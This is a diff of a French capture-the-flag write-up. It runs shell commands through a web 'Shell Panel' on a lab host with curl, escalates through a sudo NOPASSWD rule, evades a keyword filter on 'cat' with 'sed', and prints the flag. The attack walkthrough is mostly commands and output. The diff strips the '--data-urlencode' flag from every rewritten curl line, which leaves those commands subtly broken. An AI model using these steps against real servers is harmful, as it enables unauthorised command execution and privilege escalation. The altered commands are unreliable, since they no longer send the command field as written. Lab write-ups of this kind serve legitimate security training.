@@ -74,43 +74,36 @@ curl -b cookie.txt http://10.10.0.11/portal.php
 ```
 Le HTML renvoyé contient un formulaire "Shell Panel", avec un champ nommé command et un bouton nommé sub (valeur Execute). C'est ce formulaire qui exécute des commandes système côté serveur.
 
-```bash
-curl -b cookie.txt http://10.10.0.11/portal.php -d "command=id&sub=Execute"
-```
-Résultat : `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.
-
-![Résultat de id](./screenshots/h4ck3rz_rce.png)
-
 ## 6. Escalade de privilèges et récupération du flag
 
 Une recherche directe du fichier échoue :
 ```bash
-curl -b cookie.txt http://10.10.0.11/portal.php --data-urlencode "command=find / -name user.txt 2>/dev/null" -d "sub=Execute"
+curl -b cookie.txt http://10.10.0.11/portal.php "command=find / -name user.txt 2>/dev/null" -d "sub=Execute"
 ```
 Résultat vide. En listant /home :
 ```bash
-curl -b cookie.txt http://10.10.0.11/portal.php --data-urlencode "command=ls -la /home" -d "sub=Execute"
+curl -b cookie.txt http://10.10.0.11/portal.php "command=ls -la /home" -d "sub=Execute"
 ```
 Le dossier /home/titouan appartient à l'utilisateur titouan.
 
 Vérification des droits sudo de www-data :
 ```bash
-curl -b cookie.txt http://10.10.0.11/portal.php --data-urlencode "command=sudo -l" -d "sub=Execute"
+curl -b cookie.txt http://10.10.0.11/portal.php "command=sudo -l" -d "sub=Execute"
 ```
 La règle (titouan) NOPASSWD: ALL autorise www-data à exécuter n'importe quelle commande en tant que titouan, sans mot de passe :
 ```bash
-curl -b cookie.txt http://10.10.0.11/portal.php --data-urlencode "command=sudo -u titouan whoami" -d "sub=Execute"
+curl -b cookie.txt http://10.10.0.11/portal.php "command=sudo -u titouan whoami" -d "sub=Execute"
 ```
 Confirme le changement d'identité (titouan).
 
 Une tentative de lecture directe échoue à cause d'un filtre de mots-clés :
 ```bash
-curl -b cookie.txt http://10.10.0.11/portal.php --data-urlencode "command=sudo -u titouan cat /home/titouan/user.txt" -d "sub=Execute"
+curl -b cookie.txt http://10.10.0.11/portal.php "command=sudo -u titouan cat /home/titouan/user.txt" -d "sub=Execute"
 ```
 "Command contain some forbidden keywords". Le mot cat est filtré. 
 Mais il existe d'autre commande, sed -n p a été testée et a fonctionné :
 ```bash
-curl -b cookie.txt http://10.10.0.11/portal.php --data-urlencode "command=sudo -u titouan sed -n p /home/titouan/user.txt" -d "sub=Execute"
+curl -b cookie.txt http://10.10.0.11/portal.php "command=sudo -u titouan sed -n p /home/titouan/user.txt" -d "sub=Execute"
 ```
 
 **Flag : EPI{71me_70_D0_7H05E_NcuR5e2}**
